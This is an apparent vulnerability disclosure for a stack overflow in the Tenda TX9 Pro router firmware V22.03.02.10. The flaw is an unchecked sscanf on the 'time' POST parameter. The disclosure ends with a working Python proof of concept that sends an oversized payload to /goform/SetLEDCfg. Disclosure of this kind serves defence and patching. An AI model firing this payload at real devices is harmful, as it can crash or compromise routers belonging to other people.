## Overview

- Firmware download website: https://www.tendacn.com/download/detail-4219.html

## Affected version

TX9 Pro Firmware  V22.03.02.10

## Vulnerability details

The Tenda TX9 Pro Firmware  V22.03.02.10 firmware has a stack overflow vulnerability in the `sub_42BD7C` function. The `v3` variable receives the `time` parameter from a POST request and `v3` is directly parsed into the `v5`, `v6`, `v7` and `v8`. However, since the user can control the input of `v3`, the statement `sscanf(v3, "%d:%d-%d:%d", &v5, &v6, &v7, &v8);` can cause a buffer overflow by `v5`, `v6`, `v7` and `v8`.

![image-20240416115646108](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240416115646108.png)

## PoC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetLEDCfg"
payload = 'a'*1000 + ':aaaa-bbb:1'

data = {"time": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240416114654675](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240416114654675.png)
